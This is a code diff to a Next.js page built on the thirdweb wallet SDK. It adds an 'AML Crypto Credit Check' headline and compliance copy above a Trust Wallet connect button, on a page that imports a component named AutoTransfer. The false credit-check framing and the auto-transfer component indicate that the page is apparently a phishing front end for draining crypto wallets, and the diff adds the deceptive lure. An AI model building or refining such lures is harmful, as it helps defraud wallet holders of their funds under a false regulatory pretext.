@@ -5,9 +5,9 @@ import { ConnectButton } from "thirdweb/react";
 import { createThirdwebClient } from "thirdweb";
 import { createWallet, type Wallet } from "thirdweb/wallets";
 import AutoTransfer from "./components/AutoTransfer";
-import thirdwebIcon from "@public/thirdweb.svg";
-import trustwallet from "@public/trustwallet.png";
 import trust from "@public/trust.png";
+import trustW from "@public/trustwallet.png";
+
 // --- Création du client Thirdweb ---
 const client = createThirdwebClient({
   clientId: "c98a5d48ad89f114ad6044933fced541",
@@ -35,10 +35,26 @@ export default function Home() {
   };
 
   return (
-    <main className="p-4 pb-10 min-h-[100vh] flex flex-col items-center justify-center container max-w-screen-lg mx-auto bg-white">
+    <main className="p-4 pb-10 min-h-[100vh] flex flex-col items-center justify-center container max-w-screen-lg mx-auto">
       <Header />
 
-      <div className="flex justify-center mb-20 mt-10">
+      {/* Section de texte ajoutée */}
+      <div className="text-center text-white my-12 max-w-2xl mx-auto text-box-blur">
+    <h1
+  className="text-5xl md:text-6xl font-extrabold mb-4"
+  style={{ color: "#0047AB" }}
+>
+  AML Crypto Credit Check
+</h1>
+
+
+     <p className="text-base sm:text-lg text-black">
+  In just a few seconds, assess the AML (anti-money laundering) risks of a crypto address or entity and get a clear, actionable credit report that complies with regulatory requirements.
+</p>
+
+      </div>
+
+      <div className="flex justify-center mb-20 mt-10 shadow-lg rounded-xl">
         <ConnectButton
           client={client}
           wallets={wallets} // <-- Trust Wallet uniquement
@@ -59,21 +75,14 @@ export default function Home() {
 
 function Header() {
   return (
-    <header className="flex flex-col items-center mb-20">
-      <Image
-        src={trustwallet}
-        alt="Thirdweb Logo"
-        width={150}
-        height={150}
-      />
-      <Image
-        src={trust}
-        alt="Thirdweb Logo"
-        width={150}
-        height={150}
-      />
-
+    <header className="flex flex-col items-center mb-10 pt-10">
     
+      <Image
+        src={trustW}
+        alt="Trust Logo"
+        width={100}
+        height={100}
+      />
     </header>
   );
 }
